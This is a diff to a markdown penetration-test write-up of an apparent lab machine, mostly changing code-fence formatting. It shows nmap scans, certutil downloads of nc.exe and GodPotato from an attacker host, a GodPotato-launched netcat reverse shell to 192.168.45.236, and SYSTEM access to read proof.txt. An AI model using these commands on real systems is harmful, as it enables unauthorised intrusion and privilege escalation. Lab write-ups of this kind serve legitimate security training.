@@ -25,6 +25,9 @@ PORT      STATE SERVICE
 49667/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 43.87 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 135,139,445,3128,49666,49667
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-18 19:24 UTC
@@ -52,6 +55,9 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 95.45 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10                     
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-18 19:26 UTC
@@ -93,6 +99,9 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sV --script=vuln -p 139,445                          
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-18 19:28 UTC
@@ -168,6 +177,9 @@ remote: Compressing objects: 100% (16/16), done.
 remote: Total 34 (delta 11), reused 17 (delta 6), pack-reused 11 (from 1)
 Receiving objects: 100% (34/34), 7.89 KiB | 2.63 MiB/s, done.
 Resolving deltas: 100% (11/11), done.
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop/spose]
 └─$ python3 spose.py --proxy <http://$IP:3128> --target $IP
 Scanning default common ports
@@ -255,13 +267,15 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 
 I used `certutil.exe` binary to transfer `nc.exe` and `gp.exe` to the target’s `C:\\Users\\Public` directory.
 
-```sql
+```cmd
 C:\\Users\\Public>certutil -urlcache -split -f <http://192.168.45.236/nc.exe>
 ****  Online  ****
   0000  ...
   aab0
 CertUtil: -URLCache command completed successfully.
+```
 
+```cmd
 C:\\Users\\Public>certutil -urlcache -split -f <http://192.168.45.236/gp.exe>
 ****  Online  ****
   0000  ...
@@ -271,7 +285,7 @@ CertUtil: -URLCache command completed successfully.
 
 I ran GodPotato to execute a reverse shell command with elevated privileges.
 
-```sql
+```cmd
 C:\\Users\\Public>gp.exe -cmd ".\\nc.exe 192.168.45.236 80 -e C:\\Windows\\System32\\cmd.exe"
 [*] CombaseModule: 0x140714478272512
 [*] DispatchTable: 0x140714480585920
@@ -304,7 +318,7 @@ C:\\Users\\Public>gp.exe -cmd ".\\nc.exe 192.168.45.236 80 -e C:\\Windows\\Syste
 
 The exploit successfully triggered, granting me a shell as `SYSTEM` . I was then able to navigate to the Administrator’s desktop and retrieve the `proof.txt` flag.
 
-```sql
+```cmd
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ rlwrap nc -lvnp 80    
 listening on [any] 80 ...
@@ -319,7 +333,7 @@ nt authority\\system
 
 Found `proof.txt`
 
-```sql
+```cmd
 C:\\Users\\Administrator\\Desktop>type proof.txt
 type proof.txt
 e14...
